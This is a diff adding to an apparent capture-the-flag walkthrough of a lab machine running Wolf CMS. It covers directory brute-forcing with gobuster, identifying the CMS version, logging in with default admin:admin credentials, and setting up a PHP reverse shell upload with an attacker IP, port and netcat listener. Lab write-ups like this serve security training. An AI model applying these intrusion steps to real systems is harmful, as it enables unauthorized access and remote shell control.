@@ -38,3 +38,39 @@ Here 22 has no vulnearability
 I navigated to robots.txt and got the path to /wolfcms which redirected to the wolf cms homepage
 ![wolf cms homepage](screenshots/wolf_1.png)
 
+Let's use go buster to get the hidden dirs and endpoints of the cms
+
+
+```bash
+
+gobuster dir -u http://127.0.0.1/wolfcms/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.bak,.html,.js,.sh,.txt --proxy http://192.168.100.9:3128
+
+```
+
+> --proxy is used to resolve the proxy connection 
+
+![gobuster dir](screenshots/gobuster.png)
+
+Lets Navigate to /docs
+After some enumeration in files I got updataing.txt and it has following version 
+![version of wolfcms](screenshots/version.png)
+
+So wolfcms version has vulnearablity listed on exploit-db
+![exploit db](screenshots/exploit.png)
+
+So lets navigate to URL, I got a login page:
+![cms login page](screenshots/login.png)
+
+Here I tried default username and password admin:admin and got the admin access of the cms
+![admin page](screenshots/admin_page.png)
+
+Here, I got the admin dashboard which has a functionality to upload a file, I will use to upload a reverse shell php script and use netcat to listen to connection from the target machine
+
+```php
+$ip = '192.168.100.5';
+$port = 1234;
+```
+
+```bash
+nc -nlvp 1234  
+```
